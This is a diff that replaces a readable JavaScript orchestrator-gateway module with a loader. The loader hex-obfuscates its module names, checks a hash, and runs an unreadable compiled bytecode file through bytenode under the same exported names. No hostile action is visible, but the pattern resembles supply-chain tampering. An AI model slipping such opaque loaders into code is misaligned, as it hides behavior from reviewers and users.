@@ -1,48 +1,15 @@
-async function fetchTemplates(callGateway) {
-  const result = await callGateway("orchestrator.templates.list", {});
-  return result.templates ?? [];
-}
-async function quickDeployTemplate(callGateway, templateId) {
-  return callGateway("orchestrator.quick_deploy", { templateId });
-}
-async function pollDeployStatus(callGateway, planId) {
-  return callGateway("orchestrator.deploy.status", { planId });
-}
-async function proposeTeam(callGateway, requirement, answers) {
-  return callGateway("orchestrator.guided_propose", {
-    requirement,
-    userContext: JSON.stringify(answers)
-  });
-}
-async function deployProposal(callGateway, planId) {
-  return callGateway("orchestrator.guided_deploy", { planId });
-}
-async function fetchCommunityTemplates(callGateway) {
-  const result = await callGateway(
-    "orchestrator.community.list",
-    {}
-  );
-  return result.templates ?? [];
-}
-function toDeployProgress(response) {
-  return {
-    total: response.progress.total,
-    completed: response.progress.completed,
-    failed: response.progress.failed,
-    agents: response.agents.map((a) => ({
-      id: a.id,
-      name: a.name,
-      status: a.status,
-      error: a.error
-    }))
-  };
-}
-export {
-  deployProposal,
-  fetchCommunityTemplates,
-  fetchTemplates,
-  pollDeployStatus,
-  proposeTeam,
-  quickDeployTemplate,
-  toDeployProgress
-};
+"use strict";
+var _31ceecd=function(h){for(var r="",i=0;i<h.length;i+=2)r+=String.fromCharCode(parseInt(h.substr(i,2),16));return r};
+var _31ceecp=require(_31ceecd("70617468")).join(__dirname,"./orchestrator-gateway.jsc");
+var _31ceech=require(_31ceecd("63727970746f")).createHash("sha256").update(require(_31ceecd("6673")).readFileSync(_31ceecp)).digest("hex");
+if(_31ceech!==("8a72cdd3715d94819ef456e8d22a71df"+"1f39577ce8881e69125d847794367252")){console.error("[fatal] integrity check failed");process.exit(1);}
+require(_31ceecd("627974656e6f6465"));
+var _31ceecm=require(_31ceecp);
+exports.deployProposal = _31ceecm.deployProposal;
+exports.fetchCommunityTemplates = _31ceecm.fetchCommunityTemplates;
+exports.fetchTemplates = _31ceecm.fetchTemplates;
+exports.pollDeployStatus = _31ceecm.pollDeployStatus;
+exports.proposeTeam = _31ceecm.proposeTeam;
+exports.quickDeployTemplate = _31ceecm.quickDeployTemplate;
+exports.toDeployProgress = _31ceecm.toDeployProgress;
+exports.default=_31ceecm.default!==void 0?_31ceecm.default:_31ceecm;
